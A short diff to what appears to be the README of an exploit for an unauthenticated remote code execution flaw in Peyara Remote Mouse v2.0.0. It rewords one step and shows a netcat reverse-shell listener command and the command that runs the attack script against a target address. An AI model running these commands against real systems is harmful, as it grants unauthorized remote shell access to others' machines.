@@ -12,7 +12,8 @@ Peyara Remote Mouse v2.0.0 contains an unauthenticated remote code execution vul
       ```bash
    nc -nlvp 4444
       ```
-4. **Run the provided script to establish a reverse shell connection. Upon successful execution, you will gain remote access to the target system**
+4. **Execute Exploit Script**
+   Run the attack script with appropriate parameters:
 ```bash
 python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444
 ```
